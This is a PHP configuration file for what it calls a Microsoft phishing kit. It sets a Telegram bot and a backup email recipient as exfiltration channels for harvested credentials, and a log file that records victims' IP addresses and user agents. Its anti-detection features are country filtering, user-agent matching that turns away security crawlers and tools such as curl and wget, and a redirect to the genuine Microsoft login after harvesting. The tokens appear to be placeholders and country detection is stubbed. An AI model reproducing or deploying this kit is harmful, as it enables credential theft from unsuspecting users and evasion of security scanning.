<?php
// Configuration for Microsoft phishing kit

// Bot protection settings
define('BLOCK_BOTS', true);
define('ALLOWED_COUNTRIES', ['US', 'CA', 'GB', 'AU', 'DE']);

// Telegram settings
define('TELEGRAM_BOT_TOKEN', '1234567890:ABCdefGHIjklMNOpqrSTUvwxyz');
define('TELEGRAM_CHAT_ID', '-100123456789');
define('TELEGRAM_ENABLED', true);

// Email settings (backup exfiltration)
define('EMAIL_ENABLED', false);
define('EMAIL_RECIPIENT', 'harvest@example.com');

// Logging settings
define('LOG_FILE', 'harvested_data.json');
define('LOG_IP_ADDRESSES', true);
define('LOG_USER_AGENTS', true);

// Anti-detection
define('REDIRECT_BOTS_TO', 'https://www.microsoft.com');
define('REDIRECT_AFTER_HARVEST', 'https://login.microsoftonline.com');

// Bot detection patterns
$bot_patterns = [
    'bot', 'crawler', 'spider', 'scraper', 'curl', 'wget',
    'python', 'requests', 'urllib', 'httpx', 'aiohttp'
];

function is_bot($user_agent) {
    global $bot_patterns;
    $user_agent = strtolower($user_agent);
    
    foreach ($bot_patterns as $pattern) {
        if (strpos($user_agent, $pattern) !== false) {
            return true;
        }
    }
    return false;
}

function get_country_code($ip) {
    // Simplified country detection (non-functional in sample)
    return 'US'; // Default to US for sample
}

// Initialize session
session_start();
?>